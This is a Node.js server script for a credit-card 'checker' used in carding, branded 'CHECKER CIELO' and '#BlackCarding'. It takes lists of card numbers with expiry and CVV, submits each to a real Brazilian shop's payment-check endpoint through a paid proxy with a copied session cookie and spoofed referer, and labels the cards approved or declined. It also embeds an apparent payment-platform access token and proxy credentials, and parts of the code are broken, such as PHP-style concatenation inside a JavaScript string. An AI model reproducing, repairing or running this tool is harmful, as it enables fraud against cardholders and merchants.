const request = require('request')
const app = require('express')()
const http = require('http').Server(app)
const io = require('socket.io')(http)

function meupau(config) {
    return new Promise(resolve => {
        request(config, (error, retorno, d1) => resolve(d1))
    })
}

app.get('/assets/checker.js', function (req, res) {
    res.sendFile(__dirname + '/assets/checker.js');
});

app.get('/', function (req, res) {
    res.sendFile(__dirname + '/index.html');
});

var access_token = "APP_USR-6815463408150905-112603-5b72f9829047039e5471974358593639-448651802";

io.on('connection', socket => {
    socket.on('chk', data => {
        let linhas = data;
        linhas = linhas.filter((value) => {
            var explode = value.replace(/[:/;\\» ]/gmsi, '|').split('|').filter((v) => (v.trim()));
            var card = explode[0] || '';
            var mes = explode[1] || '';
            var ano = explode[2] || '';
            var cvv = explode[3] || '';

            var keys = access_token[Math.floor(Math.random() * access_token.length)];

            const x = async function () {
                let d2 = await meupau({
                    url: 'https://767jeans.com.br/pedido/check-pagamento', 
                    gzip: true,
                    method: 'get',
                    proxy: "http://nealpika:nealpika@gate.dc.smartproxy.com:20000",
                    body: `cd=20&paymentType=CreditCard&clearSaleFingerPrintSessionId=06d978bb-9701-0252-d477-6659c0bec3f8&holder=bLACK+cARD&brand=Elo&expirationDateMonth='.$mes.'&expirationDateYear='.$cvv.'&cardNumber='.$cc.'&securityCode='.$cvv.'&installments=1e`,
                    headers: {
                        "Accept": "text/javascript, text/html, application/xml, text/xml, */*",
                        "Content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "Cookie": "frontend_cid=8yYgjzSyEdC7ILmU; __utmz=174944506.1577754677.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _hjid=491f360e-771e-4426-99ce-0b277a923b05; messagesUtk=be76607a158f49bdbe06e96b606fc928; hubspotutk=4f3a426de24d49e0da283f43c077d4d8; frontend_cid=8yYgjzSyEdC7ILmU; __utma=174944506.1404442435.1577754677.1578157115.1578534573.8; __utmc=174944506; __utmt=1; _hjIncludedInSample=1; __hstc=191348469.4f3a426de24d49e0da283f43c077d4d8.1577754710105.1578157124680.1578534584453.7; __hssrc=1; external_no_cache=1; frontend=df83bd21119c40362d0e6be3746de477; __utmb=174944506.6.10.1578534573; __hssc=191348469.4.1578534584453",
                        "Referer": "https://sanmarinocapacetes.com/conclusao.html",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
                    }
                });

                msg = JSON.parse(d2);
                 console.log(d2)
                if (msg['error_messages'].includes("N7")) {
                    io.emit('resultado', { status: 0, msg: `<font color="#FF0000">#A</font><font color="#FF8000">p</font><font color="#FFFF00">r</font><font color="#007940">o</font><font color="#4040FF">v</font><font color="#A000C0">a</font><font color="#FF0000">d</font><font color="#FF8000">a</font><font color="#FFFF00">s</font> <font color="#0000FF">${card}|${mes}|${ano}|${cvv}</font> | Retorno: ${msg['error_messages']} </font> #BlackCarding` })
                } else {
                    io.emit('resultado', { status: 1, msg: `<font color="#FF0000">#R</font><font color="#FF8000">e</font><font color="#FFFF00">p</font><font color="#007940">r</font><font color="#4040FF">o</font><font color="#A000C0">v</font><font color="#FF0000">a</font><font color="#FF8000">d</font><font color="#FFFF00">a</font> <font color="#0000FF">${card}|${mes}|${ano}|${cvv}</font> | Retorno: ${msg['error_messages']} </font> #BlackCarding` })
                }
            }()
        });
    });
});

http.listen(80, function () {
    console.log('- CHECKER CIELO ON -');
    console.log('Porta: 80');
    console.log('By: Carolzinha 7');
});